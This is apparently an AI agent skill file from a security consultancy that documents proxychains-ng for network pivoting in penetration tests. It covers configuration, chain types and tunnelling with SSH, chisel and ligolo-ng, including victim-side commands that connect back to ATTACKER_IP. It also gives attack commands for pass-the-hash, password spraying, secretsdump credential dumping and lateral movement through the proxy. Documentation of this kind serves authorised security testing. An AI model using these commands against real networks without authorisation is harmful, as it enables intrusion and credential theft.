---
name: proxychains
description: >
  Configure and operate Proxychains (proxychains-ng) to route tool traffic through SOCKS4,
  SOCKS5, or HTTP proxy chains for pivoting, anonymisation, and internal network access.
  Use when routing nmap, netexec, curl, or other tools through SSH tunnels, chisel, ligolo-ng,
  or SOCKS proxies during internal network pivoting. Covers installation, chain types,
  proxy configuration, DNS resolution, integration with tunnelling tools, and pivoting methodology.
metadata:
  author: redhoundinfosec
  version: '1.0'
  language: C
---

# proxychains Agent Skill

## When to Use This Skill

Use this skill when:
- Routing attack tools through a SOCKS proxy to reach internal network segments
- Pivoting through a compromised host using SSH dynamic port forwarding or chisel
- Chaining multiple SOCKS proxies through nested network segments
- Running tools (nmap, netexec, curl, sqlmap) that don't natively support SOCKS proxies
- Avoiding direct connections from the attack box to deep internal hosts
- Need to understand proxychains-ng configuration and chain type trade-offs

## What Proxychains Does

Proxychains-ng is a preloading library (`LD_PRELOAD`) that intercepts TCP connections made by
any dynamically-linked program and routes them through a configured chain of proxies (SOCKS4,
SOCKS5, HTTP). Any command prefixed with `proxychains` will have its outbound TCP connections
redirected through the proxy chain, making it appear as if the traffic originates from the
proxy server rather than the attacker's machine. It is the standard tool for network pivoting
in pentest engagements when access to a subnet is available only via an intermediate host.

## Installation

### apt (Kali/Debian/Ubuntu)
```bash
sudo apt update && sudo apt install -y proxychains4
# Config file: /etc/proxychains4.conf
# Binary: /usr/bin/proxychains4 (aliased as proxychains)
```

### From Source (proxychains-ng)
```bash
git clone https://github.com/rofl0r/proxychains-ng.git
cd proxychains-ng
./configure --prefix=/usr --sysconfdir=/etc
make && sudo make install
sudo make install-config   # installs /etc/proxychains.conf
```

### Verify
```bash
proxychains curl http://ifconfig.me    # Should show proxy's IP, not yours
proxychains4 --version
```

## Configuration File

### File Locations (searched in order)
```
./proxychains.conf          (current directory — highest priority)
$(HOME)/.proxychains/proxychains.conf
/etc/proxychains4.conf      (system-wide default)
```

### Full Annotated Configuration
```ini
# /etc/proxychains4.conf

# Chain type — choose one:
strict_chain
# dynamic_chain
# round_robin_chain
# random_chain

# Proxy DNS through proxy (prevents DNS leaks)
proxy_dns

# Quiet mode — don't print per-connection messages
# quiet_mode

# Timeouts (milliseconds)
tcp_read_time_out 15000
tcp_connect_time_out 8000

[ProxyList]
# Format: type  host    port  [user] [pass]
# Examples:
socks5  127.0.0.1  1080
socks4  127.0.0.1  1080
http    127.0.0.1  8080
socks5  127.0.0.1  1080  username password
socks5  10.10.10.5 1080
```

## Chain Types

### strict_chain (default)
All proxies in the list are used in order. If any proxy in the chain is down, the connection
fails. Use when you need deterministic routing through specific proxies in sequence.
```ini
strict_chain
[ProxyList]
socks5  127.0.0.1  1080   # Hop 1: SSH tunnel to pivot1
socks5  127.0.0.1  1081   # Hop 2: chisel through pivot1 to pivot2
```

### dynamic_chain
Proxies are tried in order but dead proxies are skipped. The chain continues with the next
available proxy. More resilient than strict_chain but less predictable.
```ini
dynamic_chain
[ProxyList]
socks5  127.0.0.1  1080
socks5  127.0.0.1  1081
```

### round_robin_chain
Connections cycle through each proxy in the list in sequence. Useful for load distribution
across multiple SOCKS proxies.
```ini
round_robin_chain
chain_len = 1     # How many proxies per connection
[ProxyList]
socks5  127.0.0.1  1080
socks5  127.0.0.1  1081
socks5  127.0.0.1  1082
```

### random_chain
Each connection picks a random proxy from the list (or a random subset of length `chain_len`).
Useful for obfuscation when proxies are equivalent.
```ini
random_chain
chain_len = 2     # Use 2 random proxies per connection
[ProxyList]
socks5  127.0.0.1  1080
socks5  127.0.0.1  1081
socks5  127.0.0.1  1082
```

## Proxy Setup Methods

### SSH Dynamic Port Forwarding (SOCKS5)
```bash
# Create SOCKS5 proxy on local port 1080 through SSH session
ssh -D 1080 -N -f user@pivot-host

# With key
ssh -D 1080 -N -f -i /path/to/key user@pivot-host

# Background + verbose
ssh -D 1080 -N -C -q user@pivot-host &

# Configure proxychains to use it
echo "socks5  127.0.0.1  1080" >> /etc/proxychains4.conf
```

### Chisel (when SSH isn't available)
```bash
# Attacker: start chisel server
chisel server --port 8080 --reverse

# Victim: connect back and open SOCKS proxy on attacker's 1080
./chisel client ATTACKER_IP:8080 R:socks

# Configure proxychains
echo "socks5  127.0.0.1  1080" >> /etc/proxychains4.conf

# Alternative: victim opens specific port forward
./chisel client ATTACKER_IP:8080 R:8888:INTERNAL_HOST:80
```

### Ligolo-ng
```bash
# Attacker: start ligolo proxy
./proxy -selfcert -laddr 0.0.0.0:11601

# Victim: start ligolo agent
./agent -connect ATTACKER_IP:11601 -ignore-cert

# In ligolo console: start tunnel
>> session          # Select session
>> ifconfig         # View internal interfaces
>> start            # Start tunnel

# Add route to reach internal subnet
sudo ip route add 192.168.1.0/24 dev ligolo

# With ligolo-ng use direct routing, NOT proxychains
# For tool compatibility, ligolo-ng can expose a listener:
>> listener_add --addr 0.0.0.0:1234 --to 192.168.1.5:22
```

### Metasploit Socks Plugin
```
msf6 > use auxiliary/server/socks_proxy
msf6 auxiliary(server/socks_proxy) > set VERSION 5
msf6 auxiliary(server/socks_proxy) > set SRVPORT 1080
msf6 auxiliary(server/socks_proxy) > run -j
```
Then route through it: `route add 192.168.1.0 255.255.255.0 SESSION_ID`

## Tool Integration

### Nmap Through Proxychains
```bash
# Proxychains doesn't support SYN scans (raw sockets bypass LD_PRELOAD)
# Use TCP connect scan (-sT) and turn off ping (-Pn)
proxychains nmap -sT -Pn -p 22,80,443,445,3389 192.168.1.0/24

# Service detection through proxy
proxychains nmap -sT -Pn -sV -p 80,443 192.168.1.10

# Slower but accurate — increase timeouts
proxychains nmap -sT -Pn -T2 --max-retries 1 192.168.1.10

# Script scanning
proxychains nmap -sT -Pn --script=smb-os-discovery 192.168.1.10
```

### NetExec (nxc / formerly CrackMapExec)
```bash
# SMB enumeration through proxy
proxychains netexec smb 192.168.1.0/24

# Pass-the-hash through proxy
proxychains netexec smb 192.168.1.10 -u admin -H 'NT_HASH'

# Password spray through proxy
proxychains netexec smb 192.168.1.0/24 -u users.txt -p 'Password123!'

# WinRM through proxy
proxychains netexec winrm 192.168.1.10 -u admin -p 'Password123!'
```

### curl and wget
```bash
# curl through proxy
proxychains curl http://192.168.1.10/

# wget through proxy
proxychains wget http://192.168.1.10/file.txt

# Alternative: curl natively supports SOCKS
curl --socks5-hostname 127.0.0.1:1080 http://192.168.1.10/
```

### Other Common Tools
```bash
# sqlmap through proxy
proxychains sqlmap -u "http://192.168.1.10/page?id=1" --batch

# nikto through proxy
proxychains nikto -h http://192.168.1.10

# SSH hop through proxy
proxychains ssh user@192.168.1.10

# RDP through proxy (via xfreerdp)
proxychains xfreerdp /v:192.168.1.10 /u:admin /p:Password

# WinRM via evil-winrm
proxychains evil-winrm -i 192.168.1.10 -u admin -p 'Password123!'

# impacket tools
proxychains python3 /usr/share/doc/python3-impacket/examples/secretsdump.py \
  admin:'Password123!'@192.168.1.10

proxychains python3 /usr/share/doc/python3-impacket/examples/psexec.py \
  admin:'Password123!'@192.168.1.10
```

## DNS Resolution

### proxy_dns Directive
```ini
# proxychains4.conf
proxy_dns
```
When enabled, DNS lookups are sent through the proxy chain, preventing DNS leaks and allowing
resolution of internal hostnames not available from the attacker's DNS server.

```bash
# Verify DNS goes through proxy
proxychains nslookup internal.corp.local    # Should resolve via internal DNS
proxychains curl http://webserver.corp.local/
```

### Handling DNS Leaks Without proxy_dns
```bash
# Manually resolve via proxy host's DNS (SSH tunnel example)
ssh -D 1080 user@pivot
# On pivot: nslookup internal.corp.local → 192.168.1.50
# Use IP directly with proxychains
proxychains curl http://192.168.1.50/

# Or add to /etc/hosts on attacker machine
echo "192.168.1.50  webserver.corp.local" >> /etc/hosts
```

## Quiet Mode
```bash
# Inline quiet mode (suppress per-connection messages)
proxychains -q nmap -sT -Pn 192.168.1.10

# Or set in config file:
quiet_mode
```

## Multi-Hop Pivoting (Nested Networks)

### Scenario: Attacker → DMZ Host → Internal → Deep Internal
```
Attacker (10.10.10.5)
  ↓ SSH Dynamic -D 1080
DMZ Host (192.168.0.10) [pivot1]
  ↓ SSH Dynamic -D 1081 (through proxychains)
Internal Host (10.0.0.20) [pivot2]
  → Deep Internal (172.16.0.0/24)
```

```bash
# Step 1: Tunnel to DMZ host
ssh -D 1080 -N -f user@DMZ_HOST

# Step 2: Set proxychains to use port 1080
# /etc/proxychains4.conf → socks5 127.0.0.1 1080

# Step 3: SSH through proxychains to internal host, open second SOCKS proxy
proxychains ssh -D 1081 -N -f user@10.0.0.20

# Step 4: Add second proxy to chain (strict_chain)
# /etc/proxychains4.conf:
# socks5  127.0.0.1  1080   ← tunnel to DMZ
# socks5  127.0.0.1  1081   ← tunnel through DMZ to internal

# Step 5: Scan deep internal through full chain
proxychains nmap -sT -Pn -p 80,445 172.16.0.0/24
```

### Using Separate Config Files Per Hop
```bash
# Create per-hop configs
cat > /tmp/proxychains_hop1.conf << EOF
strict_chain
proxy_dns
quiet_mode
tcp_read_time_out 15000
tcp_connect_time_out 8000
[ProxyList]
socks5 127.0.0.1 1080
EOF

cat > /tmp/proxychains_hop2.conf << EOF
strict_chain
proxy_dns
quiet_mode
tcp_read_time_out 15000
tcp_connect_time_out 8000
[ProxyList]
socks5 127.0.0.1 1080
socks5 127.0.0.1 1081
EOF

# Use hop-specific config
proxychains4 -f /tmp/proxychains_hop2.conf nmap -sT -Pn 172.16.0.10
```

## Pivoting Methodology

### Standard Internal Network Pivot Workflow
```bash
# 1. Establish initial foothold / shell on pivot host
# 2. Create SOCKS proxy (SSH -D, chisel, or ligolo-ng)
# 3. Configure /etc/proxychains4.conf
# 4. Discover live hosts in internal subnets
proxychains nmap -sT -Pn -p 22,80,135,139,443,445,3389 \
  --open 192.168.1.0/24 -oG internal_sweep.txt

# 5. Service enumerate interesting hosts
proxychains nmap -sT -Pn -sV -sC -p $(cat open_ports.txt) 192.168.1.10

# 6. Exploit / lateral movement through proxy
proxychains netexec smb 192.168.1.10 -u admin -H 'HASH' --shares

# 7. Pivot deeper if another subnet is found
# Repeat from step 2 using new hop
```

## Troubleshooting

**"PROXY ERROR: Proxy Connection Refused"**
```bash
# Verify proxy is listening
ss -tlnp | grep 1080
netstat -tlnp | grep 1080

# Check SSH tunnel is still alive
ps aux | grep "ssh -D"

# Reconnect SSH tunnel
ssh -D 1080 -N -o ServerAliveInterval=30 -o ServerAliveCountMax=3 user@pivot
```

**Nmap not routing through proxy**
```bash
# SYN scan (-sS) uses raw sockets — bypasses LD_PRELOAD
# ALWAYS use -sT -Pn with proxychains
proxychains nmap -sT -Pn 192.168.1.10
```

**DNS not resolving internal hostnames**
```bash
# Enable proxy_dns in config
echo "proxy_dns" >> /etc/proxychains4.conf
# Or add to /etc/hosts manually
```

**Tool not working with proxychains (statically compiled binary)**
```bash
# Static binaries don't use LD_PRELOAD — proxychains won't work
# Solutions:
# 1. Use a dynamically linked version of the tool
# 2. Use SSH port forwarding for specific ports instead
ssh -L 8080:192.168.1.10:80 user@pivot
curl http://127.0.0.1:8080/   # Now directly accessible

# 3. Use redsocks for transparent proxying of all traffic
```

**Connection timeouts through proxy**
```bash
# Increase timeout values in config
tcp_read_time_out 30000
tcp_connect_time_out 15000
```

**Proxychains breaks tool output (garbled)**
```bash
# Use quiet mode to suppress proxychains messages
proxychains4 -q tool_name args
# Or set quiet_mode in config file
```
---

> Built by [Red Hound InfoSec](https://redhound.us) — On-demand offensive security expertise for SMBs.
> 20+ years of Fortune 500 experience. Penetration testing, attack surface analysis, and security consulting.
>
> [redhound.us](https://redhound.us) | [GitHub](https://github.com/redhoundinfosec) | [Book a consultation](https://redhound.us/#contact)
